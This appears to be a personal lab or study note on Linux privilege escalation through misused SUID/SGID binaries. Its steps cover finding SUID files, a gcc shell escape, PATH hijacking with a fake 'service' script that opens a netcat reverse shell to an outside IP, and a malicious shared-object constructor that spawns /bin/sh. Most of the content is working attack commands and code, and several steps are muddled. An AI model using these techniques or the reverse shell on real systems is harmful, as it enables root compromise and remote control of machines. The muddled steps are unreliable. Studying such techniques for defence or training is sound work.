# Missing SUID/SGID Permission

```jsx
ls -la /bin/ping
```

- **-rwsr “s” means = everyone has priv with root**

**Find all the SUID/SGID executables on the Machine**

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

```bash
find / -type f -perm -4000 2>/dev/null
```

**Need to find a non-obvious file that added the user by itself**

# **Cracking by 4 Major Techniques**

## **1. Intended Functionality (cat)**

## 2. Shell escape (gcc- **gtfobins.org**)

**uid, eid=effective user id**

```c
gcc -wrapper /bin/sh,-s x
```

## **3. Path Variable Injection**

```bash
find / -type f -perm -u=s  2>/dev/null
```

![2026-08-26 20_25_22-Misusing SUID_SGID Permission __ Linux Privilege Escalation - YouTube.png](Missing%20SUID%20SGID%20Permission/2026-08-26_20_25_22-Misusing_SUID_SGID_Permission____Linux_Privilege_Escalation_-_YouTube.png)

![2026-08-26 20_24_12-Misusing SUID_SGID Permission __ Linux Privilege Escalation - YouTube.png](Missing%20SUID%20SGID%20Permission/2026-08-26_20_24_12-Misusing_SUID_SGID_Permission____Linux_Privilege_Escalation_-_YouTube.png)

```bash
ls -la /usr/local/bin/suid-env
```

**Show human-readable** 

```bash
strings /usr/local/bin/suid-env
```

![2026-08-26 20_28_48-Misusing SUID_SGID Permission __ Linux Privilege Escalation - YouTube.png](Missing%20SUID%20SGID%20Permission/2026-08-26_20_28_48-Misusing_SUID_SGID_Permission____Linux_Privilege_Escalation_-_YouTube.png)

```bash
env
```

**path variable can be controlled** 

![2026-08-26 20_36_49-Misusing SUID_SGID Permission __ Linux Privilege Escalation - YouTube.png](Missing%20SUID%20SGID%20Permission/2026-08-26_20_36_49-Misusing_SUID_SGID_Permission____Linux_Privilege_Escalation_-_YouTube.png)

```bash
pwd
echo -e '#!/bin/sh\nnc 10.17.66.176 4444 -e /bin/sh' > service
chmod +x service
echo $PATH
PATH=/home/user:$PATH
echo $PATH
/usr/local/bin/suid-env

```

![2026-08-26 20_38_45-Misusing SUID_SGID Permission __ Linux Privilege Escalation - YouTube.png](Missing%20SUID%20SGID%20Permission/2026-08-26_20_38_45-Misusing_SUID_SGID_Permission____Linux_Privilege_Escalation_-_YouTube.png)

## **4. Shared Object Overtake**

```bash
find / -type f -perm -4000 2>/dev/null
```

![2026-08-26 20_46_25-Misusing SUID_SGID Permission __ Linux Privilege Escalation - YouTube.png](Missing%20SUID%20SGID%20Permission/2026-08-26_20_46_25-Misusing_SUID_SGID_Permission____Linux_Privilege_Escalation_-_YouTube.png)

```bash
strings /usr/local/bin/suid-so
```

## **ltrace, strace, strings, ldd = which system call is continuing, ekta program runtime a kon kon library k call korche**

```bash
strace /usr/local/bin/suid-so
```

![2026-08-26 21_04_14-Misusing SUID_SGID Permission __ Linux Privilege Escalation - YouTube.png](Missing%20SUID%20SGID%20Permission/2026-08-26_21_04_14-Misusing_SUID_SGID_Permission____Linux_Privilege_Escalation_-_YouTube.png)

```bash
strace /usr/local/bin/suid-so 2>&1 | grep /home/user/.config/libcalc.so
```

![2026-08-26 21_07_41-Misusing SUID_SGID Permission __ Linux Privilege Escalation - YouTube.png](Missing%20SUID%20SGID%20Permission/2026-08-26_21_07_41-Misusing_SUID_SGID_Permission____Linux_Privilege_Escalation_-_YouTube.png)

**No file exists, so now we can make our own file**

```bash
cd /home/user
cd .config
mkdir .config
cd .config/
ls
vim libcalc.c

```

![2026-08-26 21_11_18-Misusing SUID_SGID Permission __ Linux Privilege Escalation - YouTube.png](Missing%20SUID%20SGID%20Permission/2026-08-26_21_11_18-Misusing_SUID_SGID_Permission____Linux_Privilege_Escalation_-_YouTube.png)

**Code**

```c
void shell() __attribute__((constructor));

void shell() {
    system("/bin/sh");
}
```

![2026-08-26 21_15_04-Misusing SUID_SGID Permission __ Linux Privilege Escalation - YouTube.png](Missing%20SUID%20SGID%20Permission/2026-08-26_21_15_04-Misusing_SUID_SGID_Permission____Linux_Privilege_Escalation_-_YouTube.png)

```bash
gcc -shared -fPIC libcalc.c -o libcalc.so
```

**Run**

```bash
/home/user/.config/libcalc.so
```

![2026-08-26 21_20_04-Misusing SUID_SGID Permission __ Linux Privilege Escalation - YouTube.png](Missing%20SUID%20SGID%20Permission/2026-08-26_21_20_04-Misusing_SUID_SGID_Permission____Linux_Privilege_Escalation_-_YouTube.png)